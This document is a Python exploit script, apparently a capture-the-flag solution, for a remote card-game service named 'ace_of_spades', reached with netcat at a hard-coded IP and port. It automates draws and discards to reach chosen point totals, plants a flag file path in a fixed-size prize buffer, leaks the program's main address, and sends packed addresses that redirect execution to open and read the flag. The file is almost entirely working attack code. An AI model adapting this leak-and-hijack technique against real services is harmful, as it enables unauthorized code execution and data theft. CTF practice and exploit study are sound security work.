#!/usr/bin/env python3
import struct
import sys
import time

import pexpect


def str2card(s):
    rank = s[3] & 0xf
    if rank > 0xb:
        rank -= 1
    if s[2] == 0x82 and s[3] >= 0xa1 and s[3] <= 0xae:
        suit = 3  # clubs
    elif s[2] == 0x82 and s[3] >= 0xb1 and s[3] <= 0xbe:
        suit = 2  # hearts
    elif s[2] == 0x83 and s[3] >= 0x81 and s[3] <= 0x8e:
        suit = 0  # diamonds
    elif s[2] == 0x83 and s[3] >= 0x91 and s[3] <= 0x9e:
        suit = 1  # spades
    else:
        raise Exception(s)
    return rank + suit * 13


def wait_your_choice(p):
    if hasattr(p, 'skip_your_choice'):
        delattr(p, 'skip_your_choice')
    else:
        p.expect('Your choice:')


def choice(p, c, n):
    max_chunk = 16
    while n > 0:
        chunk = min(n, max_chunk)
        wait_your_choice(p)
        p.send((c + '  \n') * chunk)
        for _ in range(chunk - 1):
            wait_your_choice(p)
        n -= chunk


def draw(p, n=1):
    print(f'draw {n}')
    choice(p, '1', n)


def discard(p, n=1):
    print(f'discard {n}')
    choice(p, '2', n)


def play(p, prize=(('x' * 0x1f) + '\n')):
    wait_your_choice(p)
    p.sendline('3  ')
    outcome = p.expect(['Your choice:', r'Total points: (\d+)\r\nYour prize: (.*)\r\nYou can'])
    if outcome == 0:
        setattr(p, 'skip_your_choice', True)
        return None, None
    else:
        actual_points, actual_prize = int(p.match.group(1)), p.match.group(2)
        p.expect('Choose:')
        if prize is None:
            p.sendline('1  ')
        else:
            p.sendline('2  ')
            p.send(prize)
        return actual_points, actual_prize


def receive_hand(p):
    outcome = p.expect(['Your hand is:', 'Your hand is empty!'])
    if outcome == 0:
        p.readline()
        return [str2card(s) for s in p.readline().split()]
    else:
        return []


def get_hand(p):
    wait_your_choice(p)
    p.sendline('4  ')
    return receive_hand(p)


def fold(p):
    wait_your_choice(p)
    p.sendline('5  ')


def leave(p):
    wait_your_choice(p)
    p.sendline('6  ')


def print_hand(p):
    hand = get_hand(p)
    print(f'{len(hand)}: {hand}')
    return hand


RANK_TO_POINTS = [0x4B0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x12C, 0x258, 0x384]


def points(cards):
    aos = 0
    result = 0
    for card in cards:
        if card == 0x28:
            aos += 1
        else:
            result += RANK_TO_POINTS[(card - 1) % 13]
    result *= (2 ** aos)
    return result


def strcpy_problem(p):
    for _ in range(52):
        draw(p)
    h = print_hand(p)
    for _ in range(52):
        discard(p)
        h1 = print_hand(p)
        if h[1:] != h1:
            print('^^^ BUG ^^^')
        h = h1
    fold(p)


#p = pexpect.spawn('gdb -batch -x gdbscript ./ace_of_spades', logfile=sys.stderr.buffer)
#p = pexpect.spawn('valgrind --log-file=valgrind.log ./ace_of_spades', logfile=sys.stderr.buffer)
#p = pexpect.spawn('valgrind --log-file=valgrind.log ./ace_of_spades')
#p = pexpect.spawn('./ace_of_spades', logfile=sys.stderr.buffer)
#p = pexpect.spawn('./ace_of_spades')
p = pexpect.spawn('nc 137.117.216.128 13375')
#p = pexpect.spawn('nc 137.117.216.128 13375', logfile=sys.stderr.buffer)
main_addr = None
flag_txt_points = None
restarted = False
while True:
    draw(p, 52)
    h = print_hand(p)
    print(f'total: {points(h)}')
    retry = False
    for i in range(52 - 5):
        current_points = points(h[i:i + 5])
        if restarted and current_points // 1000 == flag_txt_points // 1000:
            discard(p, i)
            h = print_hand(p)
            if current_points == points(h[i:i + 5]):
                print(f'^^^ PLAY {current_points} ^^^')
                print(play(p, prize=None))
                sys.exit(0)
            retry = True
            break
        elif current_points >= 1000 and current_points < 11000 and flag_txt_points is None:
            discard(p, i)
            h = print_hand(p)
            if current_points == points(h[i:i + 5]):
                print(f'^^^ PLAY {current_points} ^^^')
                payload = b'/home/ace_of_spades/flag'
                payload += b'\0' + b'x' * (0x1e - len(payload)) + b'\n'
                assert(len(payload) == 0x20)
                play(p, prize=payload)
                flag_txt_points = current_points
            retry = True
            break
        elif current_points >= 16000 and current_points < 17000:
            discard(p, i)
            h = print_hand(p)
            if current_points == points(h[i:i + 5]):
                print(f'^^^ PLAY {current_points} ^^^')
                if main_addr is None:
                    actual_points, actual_prize = play(p, prize=None)
                    main_addr, = struct.unpack('<I', actual_prize[4:8])
                    main_addr -= 147
                    print(f'main is at {main_addr:x}')
                else:
                    open_addr = main_addr - 0x12c2 + 0x680
                    write_addr = main_addr - 0x12c2 + 0x698
                    got_addr = main_addr - 0x12c2 + 0x2f98
                    exit_addr = main_addr - 0x12c2 + 0x678
                    flag_txt_addr = main_addr - 0x12c2 + 0x3080 + 0x20 * (flag_txt_points // 1000)
                    got_size = 100
                    risky_addr = main_addr - 0x12c2 + 0x1308
                    payload = struct.pack('<IIIIIII', 0, open_addr, risky_addr, flag_txt_addr, 64, 0, 0) + b'xxx\n'
                    assert(len(payload) == 0x20)
                    play(p, prize=payload)
                    leave(p)
                    restarted = True
            retry = True
            break
    if retry:
        continue
    p45 = RANK_TO_POINTS[(h[45] - 1) % 13]
    p46 = RANK_TO_POINTS[(h[46] - 1) % 13]
    p47 = RANK_TO_POINTS[(h[47] - 1) % 13]
    discard0 = p45 + p46
    discard8 = p46 + p46
    discard9 = p46 + p47
    discard24 = p47 + p47
    if h[45] == 0x28:
        n_discard = 0
    elif h[46] == 0x28:
        n_discard = 8
    elif h[47] == 0x28:
        n_discard = 24
    elif p45 == 0 and discard8 > discard9 and discard8 > discard24:
        n_discard = 8
    elif p45 == 0 and discard9 > discard8 and discard9 > discard24:
        n_discard = 9
    elif p45 == 0 and p46 == 0 and discard24 > discard8 and discard24 > discard9:
        n_discard = 24
    else:
        n_discard = 0
    if n_discard > 0:
        discard(p, n_discard)
        h = print_hand(p)
    fold(p)
leave()
